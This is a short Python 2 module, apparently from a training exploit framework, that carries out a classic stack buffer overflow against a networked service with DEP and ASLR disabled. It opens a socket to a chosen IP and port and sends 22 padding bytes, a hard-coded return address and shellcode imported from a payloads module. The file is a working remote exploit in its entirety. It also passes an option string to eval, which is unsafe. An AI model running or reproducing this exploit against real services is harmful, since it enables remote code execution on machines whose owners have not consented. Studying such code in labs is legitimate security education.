#coding:UTF-8
'''经典缓冲区溢出(DEP - off, ALSR - off)'''

import socket
import struct
import sys
sys.path.append("..")
import payloads
from payloads import *
# from pwn import *

class exploit(object):
    'exploit1'
    def __init__(self, options):
        self.options = options
        # self.info = {'ret':0xbffff180, 'offset':22}
        self.info = {'ret':0x08048814, 'offset':22}
    def test(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.options['dIP'], int(self.options['dPort'])))
        payload = eval(self.options['payload']).payload()
        ret_addr = struct.pack('<I', self.info['ret'])
        # ret_addr = p32(self.info['ret'])
        print ret_addr
        # print hex(ret_addr)
        data = 'A' * self.info['offset'] + ret_addr + payload.data
        print data
        s.send(data)
        s.close()

if __name__=='__main__':
    pass
